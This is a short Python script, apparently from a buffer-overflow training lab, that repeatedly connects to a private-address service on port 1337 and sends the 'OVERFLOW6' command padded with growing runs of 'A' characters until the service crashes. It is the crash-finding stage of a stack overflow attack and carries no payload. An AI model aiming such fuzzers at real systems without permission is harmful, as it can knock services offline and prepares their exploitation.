#!/usr/bin/env python3

import socket, sys, time

ip = "10.10.184.172"
port = 1337
timeout = 5

prefix = "OVERFLOW6 "
buffer = "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes...".format(len(buffer)))
            s.send(bytes(prefix + buffer, "latin-1"))
            s.recv(1024)
    except:
        print("Program crashed at {} bytes!".format(len(buffer)))
        sys.exit(0)
    buffer += "A" * 100
    time.sleep(1)

